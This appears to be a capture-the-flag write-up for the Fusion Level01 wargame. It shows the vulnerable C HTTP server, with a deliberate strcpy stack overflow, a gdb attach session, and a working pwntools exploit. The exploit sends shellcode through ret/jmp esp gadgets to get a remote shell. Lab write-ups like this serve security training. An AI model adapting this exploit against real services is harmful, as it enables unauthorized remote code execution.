### challenge
```txt
Fusion Level01
About
level00 with stack/heap/mmap aslr, without info leak :)

Vulnerability Type	Stack
Position Independent Executable	No
Read only relocations	No
Non-Executable stack	No
Non-Executable heap	No
Address Space Layout Randomisation	Yes
Source Fortification	No
```

### debugging
```txt
root@fusion:/opt/fusion/bin# netstat -tulpn | grep 20001
tcp        0      0 0.0.0.0:20001           0.0.0.0:*               LISTEN      2739/level01

root@fusion:/opt/fusion/bin# netstat -tulpn | grep 20001
tcp        0      0 0.0.0.0:20001           0.0.0.0:*               LISTEN      2739/level01
root@fusion:/opt/fusion/bin# gdb -q
(gdb) set follow-fork-mode child
(gdb) attach 2739
Attaching to process 2739
Reading symbols from /opt/fusion/bin/level01...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.13.so...done.
done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb773c424 in __kernel_vsyscall ()
(gdb) c
Continuing.
```

### level01.c
```c
#include "../common/common.c"    

int fix_path(char *path)
{
  char resolved[128];
  
  if(realpath(path, resolved) == NULL) return 1; // can't access path. will error trying to open
  strcpy(path, resolved);
}

char *parse_http_request()
{
  char buffer[1024];
  char *path;
  char *q;

  // printf("[debug] buffer is at 0x%08x :-)\n", buffer); :D

  if(read(0, buffer, sizeof(buffer)) <= 0) errx(0, "Failed to read from remote host");
  if(memcmp(buffer, "GET ", 4) != 0) errx(0, "Not a GET request");

  path = &buffer[4];
  q = strchr(path, ' ');
  if(! q) errx(0, "No protocol version specified");
  *q++ = 0;
  if(strncmp(q, "HTTP/1.1", 8) != 0) errx(0, "Invalid protocol");

  fix_path(path);

  printf("trying to access %s\n", path);

  return path;
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *p;

  background_process(NAME, UID, GID); 
  fd = serve_forever(PORT);
  set_io(fd);

  parse_http_request(); 
}
```


### solution
```py
#!/usr/bin/python
from pwn import *

context.arch = 'i386'
context.terminal = ['tmux']
context.os = 'linux'
context.bits = 32

ret_b8 = 0x08048f85 # 0x08048f85 : ret 0xb8
jmp_esp = 0x08049f4f # 0x08049f4f : jmp esp
shellcode = asm(shellcraft.sh())

buf =  "GET /home/fusion/"
buf += "A"*127
buf += p32(ret_b8)
buf += p32(jmp_esp)
buf += "B"*184
buf += "\x90"*8
buf += shellcode
buf += "\xCC"*264
buf += " HTTP/1.1\r\n"

p = remote('fusion', 20001)
p.send(buf)
p.interactive()
```